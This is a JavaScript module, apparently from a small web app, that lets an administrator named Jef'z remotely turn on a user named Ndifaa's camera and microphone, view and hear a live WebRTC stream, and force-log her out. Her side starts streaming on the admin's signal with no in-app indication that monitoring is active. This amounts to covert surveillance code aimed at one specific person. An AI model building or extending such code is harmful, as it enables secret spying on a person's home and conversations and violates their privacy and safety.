// ================================================================
// MONITOR.JS - WebRTC Monitoring
// Auto fallback: kalau kamera tidak ada, pakai audio saja
// ================================================================

const ICE_SERVERS = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:stun2.l.google.com:19302' },
  ]
};

const ADMIN_NAME = "Jef'z";
const USER_NAME  = "Ndifaa";

let monitorChannel  = null;
let peerConnection  = null;
let localStream     = null;
let isVideoOn       = false;
let isAudioOn       = false;
let streamActive    = false;
let monitorInited   = false;
let hasCamera       = false; // apakah kamera tersedia
let hasMic          = false; // apakah mikrofon tersedia

// ===== INIT =====
async function initMonitor() {
  if (monitorInited) return;
  monitorInited = true;
  if (!currentAccount) return;

  if (currentAccount.name === USER_NAME) {
    await initUserSide();
  } else if (currentAccount.name === ADMIN_NAME) {
    initAdminSide();
  }

  listenForceLogout();
}

// ================================================================
// SISI NDIFAA
// ================================================================

async function initUserSide() {
  // Cek perangkat yang tersedia dulu
  await detectDevices();

  if (!hasCamera && !hasMic) {
    showMonitorNotice('Tidak ada kamera atau mikrofon yang terdeteksi.');
    return;
  }

  // Coba ambil stream sesuai perangkat yang tersedia
  await requestStream();

  // Listen sinyal dari admin
  listenSignals(USER_NAME, async (signal) => {
    if (signal.type === 'start_stream') {
      await startUserStream();
    } else if (signal.type === 'stop_stream') {
      stopUserStream();
    } else if (signal.type === 'answer') {
      await handleAnswer(signal.payload);
    } else if (signal.type === 'ice_candidate') {
      await handleRemoteIce(signal.payload);
    }
  });
}

// Deteksi perangkat yang tersedia
async function detectDevices() {
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    hasCamera = devices.some(d => d.kind === 'videoinput');
    hasMic    = devices.some(d => d.kind === 'audioinput');
    console.log('[Monitor] Camera:', hasCamera, '| Mic:', hasMic);
  } catch (e) {
    console.error('[Monitor] detectDevices error:', e);
  }
}

// Minta stream sesuai perangkat tersedia
async function requestStream() {
  // Coba video + audio dulu
  if (hasCamera && hasMic) {
    try {
      localStream = await navigator.mediaDevices.getUserMedia({
        video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
        audio: { echoCancellation: true, noiseSuppression: true }
      });
      console.log('[Monitor] Stream: video + audio OK');
      return;
    } catch (e) {
      console.warn('[Monitor] video+audio gagal, coba audio saja:', e.message);
    }
  }

  // Fallback: audio saja
  if (hasMic) {
    try {
      localStream = await navigator.mediaDevices.getUserMedia({
        video: false,
        audio: { echoCancellation: true, noiseSuppression: true }
      });
      hasCamera = false; // confirm tidak ada video
      console.log('[Monitor] Stream: audio only OK');
      return;
    } catch (e) {
      console.warn('[Monitor] audio saja juga gagal:', e.message);
    }
  }

  // Fallback: video saja (jarang tapi mungkin)
  if (hasCamera) {
    try {
      localStream = await navigator.mediaDevices.getUserMedia({
        video: { width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false
      });
      hasMic = false;
      console.log('[Monitor] Stream: video only OK');
      return;
    } catch (e) {
      console.warn('[Monitor] video saja gagal:', e.message);
    }
  }

  // Semua gagal
  showMonitorNotice('Gagal mengakses kamera/mikrofon. Periksa izin di Settings browser.');
}

async function startUserStream() {
  if (!localStream) {
    // Coba request lagi kalau belum ada
    await requestStream();
    if (!localStream) return;
  }

  // Tutup koneksi lama kalau ada
  if (peerConnection) { try { peerConnection.close(); } catch (e) {} peerConnection = null; }

  peerConnection = new RTCPeerConnection(ICE_SERVERS);

  // Tambahkan semua track yang tersedia
  localStream.getTracks().forEach(track => {
    peerConnection.addTrack(track, localStream);
  });

  peerConnection.onicecandidate = async (event) => {
    if (event.candidate) {
      await sendSignal({ type: 'ice_candidate', from: USER_NAME, to: ADMIN_NAME, payload: JSON.stringify(event.candidate) });
    }
  };

  peerConnection.onconnectionstatechange = () => {
    console.log('[Monitor] Connection state:', peerConnection.connectionState);
  };

  // Kirim info apakah ada video atau tidak (biar admin tahu)
  const offer = await peerConnection.createOffer();
  await peerConnection.setLocalDescription(offer);

  await sendSignal({
    type:    'offer',
    from:    USER_NAME,
    to:      ADMIN_NAME,
    payload: JSON.stringify({ offer, hasVideo: hasCamera, hasAudio: hasMic })
  });

  console.log('[Monitor] Offer dikirim ke admin');
}

async function handleAnswer(answerPayload) {
  if (!peerConnection) return;
  try {
    const parsed = JSON.parse(answerPayload);
    const answer = parsed.answer || parsed; // support format lama
    await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
    console.log('[Monitor] Answer diterima, koneksi tersambung');
  } catch (e) {
    console.error('[Monitor] handleAnswer error:', e);
  }
}

function stopUserStream() {
  if (peerConnection) { try { peerConnection.close(); } catch (e) {} peerConnection = null; }
  console.log('[Monitor] Stream dihentikan');
}

// ================================================================
// SISI ADMIN (JEF'Z)
// ================================================================

function initAdminSide() {
  renderAdminControls();

  listenSignals(ADMIN_NAME, async (signal) => {
    if (signal.type === 'offer') {
      await handleOffer(signal.payload);
    } else if (signal.type === 'ice_candidate') {
      await handleRemoteIce(signal.payload);
    }
  });
}

function renderAdminControls() {
  const topbarRight = document.querySelector('.topbar-right');
  if (!topbarRight || document.getElementById('monitorControls')) return;

  const wrap = document.createElement('div');
  wrap.id = 'monitorControls';
  wrap.style.cssText = 'display:flex;gap:4px;align-items:center;';

  // Tombol Video
  const videoBtn = document.createElement('button');
  videoBtn.id = 'monitorVideoBtn';
  videoBtn.className = 'tb-btn monitor-btn';
  videoBtn.title = 'Monitor Video (ON/OFF)';
  videoBtn.innerHTML = '📵';
  videoBtn.onclick = toggleMonitorVideo;
  wrap.appendChild(videoBtn);

  // Tombol Audio
  const audioBtn = document.createElement('button');
  audioBtn.id = 'monitorAudioBtn';
  audioBtn.className = 'tb-btn monitor-btn';
  audioBtn.title = 'Monitor Audio (ON/OFF)';
  audioBtn.innerHTML = '🔇';
  audioBtn.onclick = toggleMonitorAudio;
  wrap.appendChild(audioBtn);

  // Tombol Force Logout
  const logoutBtn = document.createElement('button');
  logoutBtn.id = 'forceLogoutBtn';
  logoutBtn.className = 'tb-btn monitor-btn';
  logoutBtn.title = 'Force Logout Ndifaa';
  logoutBtn.innerHTML = '⏏';
  logoutBtn.style.color = 'var(--danger)';
  logoutBtn.onclick = forceLogoutUser;
  wrap.appendChild(logoutBtn);

  // Insert sebelum theme button
  const themeBtn = topbarRight.querySelector('.theme-btn');
  if (themeBtn) topbarRight.insertBefore(wrap, themeBtn);
  else topbarRight.prepend(wrap);

  // Monitor view (floating video/audio indicator)
  const monitorView = document.createElement('div');
  monitorView.id = 'monitorView';
  monitorView.style.cssText = [
    'display:none',
    'position:fixed',
    'bottom:calc(var(--nav-h) + 12px)',
    'right:12px',
    'z-index:500',
    'border-radius:16px',
    'overflow:hidden',
    'box-shadow:0 8px 32px rgba(0,0,0,0.4)',
    'border:2px solid rgba(255,255,255,0.2)',
    'background:#000',
  ].join(';');

  monitorView.innerHTML =
    // Video element (tersembunyi kalau audio only)
    '<video id="monitorVideo" autoplay playsinline muted style="width:200px;height:150px;object-fit:cover;display:block;background:#000;"></video>' +
    // Audio only indicator
    '<div id="audioOnlyBadge" style="display:none;width:200px;height:80px;background:linear-gradient(135deg,#1c1c1e,#2c2c2e);align-items:center;justify-content:center;flex-direction:column;gap:8px;">' +
      '<div style="font-size:32px;">🎙</div>' +
      '<div style="font-size:11px;color:#ffffffcc;font-weight:600;">Audio Only</div>' +
    '</div>' +
    // Live badge
    '<div style="position:absolute;top:6px;left:8px;font-size:10px;font-weight:700;color:white;text-shadow:0 1px 4px rgba(0,0,0,0.8);background:rgba(255,59,48,0.9);padding:2px 6px;border-radius:6px;">● LIVE</div>' +
    // Tombol tutup
    '<button onclick="hideMonitorView()" style="position:absolute;top:4px;right:4px;background:rgba(0,0,0,0.6);border:none;color:white;border-radius:50%;width:24px;height:24px;font-size:12px;cursor:pointer;display:flex;align-items:center;justify-content:center;line-height:1;">✕</button>';

  document.body.appendChild(monitorView);
}

async function toggleMonitorVideo() {
  const btn = document.getElementById('monitorVideoBtn');

  if (!isVideoOn && !streamActive) {
    // Mulai monitoring
    isVideoOn = true;
    btn.innerHTML = '📹';
    btn.style.color = '#34c759';
    await sendSignal({ type: 'start_stream', from: ADMIN_NAME, to: USER_NAME, payload: '{}' });
    streamActive = true;
    toast('Monitoring dimulai...');
  } else if (isVideoOn) {
    // Stop monitoring
    isVideoOn = false;
    btn.innerHTML = '📵';
    btn.style.color = '';
    isAudioOn = false;
    const audioBtn = document.getElementById('monitorAudioBtn');
    if (audioBtn) { audioBtn.innerHTML = '🔇'; audioBtn.style.color = ''; }
    await sendSignal({ type: 'stop_stream', from: ADMIN_NAME, to: USER_NAME, payload: '{}' });
    stopAdminStream();
  }
}

async function toggleMonitorAudio() {
  const btn = document.getElementById('monitorAudioBtn');
  const vid = document.getElementById('monitorVideo');

  if (!isAudioOn) {
    isAudioOn = true;
    btn.innerHTML = '🔊';
    btn.style.color = '#34c759';
    if (vid) vid.muted = false;

    // Kalau stream belum aktif, mulai dulu
    if (!streamActive) {
      isVideoOn = true;
      const videoBtn = document.getElementById('monitorVideoBtn');
      if (videoBtn) { videoBtn.innerHTML = '📹'; videoBtn.style.color = '#34c759'; }
      await sendSignal({ type: 'start_stream', from: ADMIN_NAME, to: USER_NAME, payload: '{}' });
      streamActive = true;
      toast('Audio monitoring aktif...');
    } else {
      toast('Audio ON');
    }
  } else {
    isAudioOn = false;
    btn.innerHTML = '🔇';
    btn.style.color = '';
    if (vid) vid.muted = true;
    toast('Audio muted');
  }
}

async function handleOffer(offerPayload) {
  if (peerConnection) { try { peerConnection.close(); } catch (e) {} peerConnection = null; }

  peerConnection = new RTCPeerConnection(ICE_SERVERS);

  peerConnection.onicecandidate = async (event) => {
    if (event.candidate) {
      await sendSignal({ type: 'ice_candidate', from: ADMIN_NAME, to: USER_NAME, payload: JSON.stringify(event.candidate) });
    }
  };

  peerConnection.onconnectionstatechange = () => {
    console.log('[Monitor] Admin connection state:', peerConnection.connectionState);
    if (peerConnection.connectionState === 'failed') {
      toast('Koneksi monitor gagal, coba lagi', false);
      stopAdminStream();
    }
  };

  // Terima stream dari Ndifaa
  peerConnection.ontrack = (event) => {
    console.log('[Monitor] Track diterima:', event.track.kind);
    const vid   = document.getElementById('monitorVideo');
    const view  = document.getElementById('monitorView');
    const badge = document.getElementById('audioOnlyBadge');

    if (!vid || !view) return;

    if (vid.srcObject !== event.streams[0]) {
      vid.srcObject = event.streams[0];
    }
    vid.muted = !isAudioOn;

    // Cek apakah ada video track
    const hasVideoTrack = event.streams[0].getVideoTracks().length > 0;

    if (hasVideoTrack) {
      // Ada video
      vid.style.display = 'block';
      if (badge) badge.style.display = 'none';
      view.style.width = '';
    } else {
      // Audio only — tampilkan badge
      vid.style.display = 'none';
      if (badge) { badge.style.display = 'flex'; }
      view.style.width = '200px';
    }

    view.style.display = 'block';
    toast('Monitor tersambung ✓');
  };

  // Parse payload
  let offer, hasVideo = true, hasAudio = true;
  try {
    const parsed = JSON.parse(offerPayload);
    if (parsed.offer) {
      offer    = parsed.offer;
      hasVideo = parsed.hasVideo !== undefined ? parsed.hasVideo : true;
      hasAudio = parsed.hasAudio !== undefined ? parsed.hasAudio : true;
    } else {
      offer = parsed; // format lama
    }
    console.log('[Monitor] Offer diterima | hasVideo:', hasVideo, '| hasAudio:', hasAudio);
  } catch (e) {
    console.error('[Monitor] Parse offer error:', e);
    return;
  }

  await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));

  const answer = await peerConnection.createAnswer();
  await peerConnection.setLocalDescription(answer);

  await sendSignal({
    type:    'answer',
    from:    ADMIN_NAME,
    to:      USER_NAME,
    payload: JSON.stringify({ answer })
  });

  console.log('[Monitor] Answer dikirim ke Ndifaa');
}

function stopAdminStream() {
  if (peerConnection) { try { peerConnection.close(); } catch (e) {} peerConnection = null; }
  streamActive = false;
  isVideoOn    = false;
  isAudioOn    = false;

  const videoBtn = document.getElementById('monitorVideoBtn');
  const audioBtn = document.getElementById('monitorAudioBtn');
  if (videoBtn) { videoBtn.innerHTML = '📵'; videoBtn.style.color = ''; }
  if (audioBtn) { audioBtn.innerHTML = '🔇'; audioBtn.style.color = ''; }

  const view = document.getElementById('monitorView');
  if (view) view.style.display = 'none';

  const vid = document.getElementById('monitorVideo');
  if (vid) { try { vid.srcObject = null; } catch (e) {} }
}

function hideMonitorView() {
  const view = document.getElementById('monitorView');
  if (view) view.style.display = 'none';
}

// ================================================================
// FORCE LOGOUT
// ================================================================

async function forceLogoutUser() {
  const ok = await showConfirm('Logout Ndifaa dari semua device?', {
    icon: '⏏', title: 'Force Logout', okText: 'Logout', cancelText: 'Batal'
  });
  if (!ok) return;
  try {
    await sb.rpc('force_logout_user', { p_username: USER_NAME });
    toast('Ndifaa berhasil di-logout');
  } catch (err) {
    // Fallback: insert langsung
    try {
      await sb.from('webrtc_signals').insert([{
        type: 'force_logout', from_user: ADMIN_NAME, to_user: USER_NAME, payload: '{}'
      }]);
      await sb.from('user_sessions').delete().eq('username', USER_NAME);
      toast('Ndifaa berhasil di-logout');
    } catch (e) {
      toast('Gagal logout', false);
    }
  }
}

function listenForceLogout() {
  if (!currentAccount || currentAccount.name !== USER_NAME) return;

  sb.channel('force_logout_watch_' + Date.now())
    .on('postgres_changes', {
      event:  'INSERT',
      schema: 'public',
      table:  'webrtc_signals',
      filter: 'to_user=eq.' + USER_NAME
    }, (payload) => {
      if (!payload.new) return;
      if (payload.new.type === 'force_logout') {
        toast('Session diakhiri oleh admin');
        setTimeout(() => {
          sessionStorage.clear();
          window.location.href = 'index.html';
        }, 1500);
      }
    })
    .subscribe();
}

// ================================================================
// SHARED HELPERS
// ================================================================

async function sendSignal({ type, from, to, payload }) {
  try {
    await sb.from('webrtc_signals').insert([{
      type, from_user: from, to_user: to, payload: payload || '{}'
    }]);
  } catch (err) {
    console.error('[Monitor] sendSignal error:', err);
  }
}

function listenSignals(forUser, callback) {
  if (monitorChannel) { try { sb.removeChannel(monitorChannel); } catch (e) {} }

  monitorChannel = sb.channel('monitor_' + forUser + '_' + Date.now())
    .on('postgres_changes', {
      event:  'INSERT',
      schema: 'public',
      table:  'webrtc_signals',
      filter: 'to_user=eq.' + forUser
    }, (payload) => {
      if (!payload.new) return;
      // Abaikan sinyal force_logout di sini (sudah handle di listenForceLogout)
      if (payload.new.type === 'force_logout') return;
      console.log('[Monitor] Sinyal diterima:', payload.new.type);
      callback(payload.new);
    })
    .subscribe();
}

async function handleRemoteIce(icePayload) {
  if (!peerConnection) return;
  try {
    const candidate = JSON.parse(icePayload);
    await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
  } catch (e) {
    console.warn('[Monitor] addIceCandidate error:', e.message);
  }
}

function showMonitorNotice(msg) {
  console.warn('[Monitor]', msg);
  const t = document.getElementById('toast');
  if (!t) return;
  t.textContent = msg;
  t.className = 'toast show err';
  setTimeout(() => { t.className = 'toast'; }, 6000);
}

// ================================================================
// AUTO INIT
// ================================================================
document.addEventListener('DOMContentLoaded', () => {
  setTimeout(() => {
    if (typeof initMonitor === 'function' && typeof currentAccount !== 'undefined' && currentAccount) {
      // Sudah di-handle dari checkMonitorPerm di dashboard.js
      // initMonitor dipanggil dari sana
    }
  }, 500);
});
